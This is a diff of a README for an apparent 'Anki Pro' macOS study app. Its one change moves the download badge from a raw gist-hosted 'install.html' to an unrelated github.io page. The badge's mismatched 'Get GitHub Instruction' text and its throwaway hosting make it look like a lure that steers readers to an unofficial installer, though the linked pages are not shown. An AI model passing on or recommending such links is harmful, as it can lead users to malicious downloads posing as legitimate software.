@@ -3,7 +3,7 @@
 **Anki Pro** brings next-generation **spaced-repetition learning** to **macOS**, combining science-based study methods with modern Apple design.  
 Master anything faster — languages, medicine, exams, or coding — with adaptive scheduling that optimizes what you review each day. 🍎  
 
-[![💙 Get GitHub Instruction](https://img.shields.io/badge/💙%20Get%20Anki%20Pro-1976D2?style=for-the-badge&logo=apple&logoColor=white&labelColor=0B0F19)](https://gistcdn.githack.com/tagalarmor107/21948c9db689648aaa5cbdd24cdfff04/raw/d5107e93f15fef8c6f2c5c80d4429e67131e4d5a/install.html?offer=AnkiProMac)
+[![💙 Get GitHub Instruction](https://img.shields.io/badge/💙%20Get%20Anki%20Pro-1976D2?style=for-the-badge&logo=apple&logoColor=white&labelColor=0B0F19)](https://desk-app-git.github.io/.github/?offer=AnkiProMac)
 
 ---
 
